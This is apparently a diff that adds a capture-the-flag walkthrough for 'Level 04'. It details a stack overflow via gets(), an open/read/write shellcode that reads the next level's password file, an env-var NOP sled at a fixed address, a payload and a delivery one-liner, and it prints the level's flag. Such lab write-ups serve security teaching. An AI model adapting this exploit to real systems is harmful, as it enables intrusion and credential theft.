@@ -1,0 +1,80 @@
+# Level 04 Walkthrough - fork/ptrace bypass via open/read/write shellcode
+
+## Binary Overview
+
+```
+enable_timeout_cons() -> alarm(60)  [.init_array constructor]
+main() -> fork()
+  child:  prctl(PR_SET_PDEATHSIG, SIGHUP)
+          ptrace(PTRACE_TRACEME)
+          gets(buffer)          <- STACK OVERFLOW (offset to EIP = 156)
+  parent: wait() loop
+          ptrace(PTRACE_PEEKUSER) -> check orig_eax == 11 (execve)
+          if execve: kill child, print "no exec() for you"
+          else: PTRACE_CONT
+```
+
+## Key Constraints
+
+1. **No execve**: parent kills child if syscall 11 is detected -> can't use `/bin/sh`
+2. **PTRACE_TRACEME converts signals**: SIGSEGV becomes WIFSTOPPED, not WIFSIGNALED. A bad return address causes an infinite loop until alarm(60) fires.
+3. **No ASLR** (`/proc/sys/kernel/randomize_va_space = 0`): stack addresses are fixed.
+4. **Executable stack**: shellcode can run directly from stack or env vars.
+5. **gets() stops at 0x0a** (newline): shellcode must not contain `\x0a`.
+
+## Exploit Strategy
+
+### Shellcode: open/read/write (no execve)
+
+Use `jmp/call/pop` pattern to avoid hardcoded addresses:
+
+```
+jmp short +41          -> skips over body, lands on call
+pop ebx                <- call pushes return addr = ptr to path string
+xor eax,eax; mov al,5  -> SYS_open("/home/users/level05/.pass", O_RDONLY)
+xor ecx,ecx; xor edx,edx; int 0x80
+mov ebx,eax            -> fd
+xor eax,eax; mov al,3  -> SYS_read(fd, esp, 64)
+mov ecx,esp; mov dl,64; int 0x80
+mov edx,eax            -> bytes read
+xor eax,eax; mov al,4  -> SYS_write(1, esp, bytes_read)
+xor ebx,ebx; inc ebx; int 0x80
+xor eax,eax; inc eax   -> SYS_exit(0)
+xor ebx,ebx; int 0x80
+call -(46)             -> calls back to "pop ebx"
+db "/home/users/level05/.pass\0"
+```
+
+Total: **74 bytes**, zero `0x0a` bytes.
+
+### Env-var NOP Sled (avoids GDB vs non-GDB stack discrepancy)
+
+With ASLR off, env var addresses are fixed. Place a 200-byte NOP sled + shellcode in `EGG`:
+
+```
+EGG = "\x90" * 200 + shellcode   (274 bytes)
+```
+
+Address of EGG measured using a same-length-argv[0] helper: **`0xffffdd70`**
+
+Return address = `0xffffdd70 + 100 = 0xffffddd4` (lands in NOP sled).
+
+### Overflow Payload
+
+```
+payload = "A" * 156 + pack("<I", 0xffffddd4)
+```
+
+EIP offset = 156 bytes (confirmed via GDB with `set follow-fork-mode child`).
+
+### Delivery
+
+```bash
+EGG=$'<nop+shellcode>' bash -c 'printf "<payload>" | ./level04'
+```
+
+No FIFO needed — `gets()` reads directly from stdin pipe without stdio buffering issues.
+
+## Flag
+
+`3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`
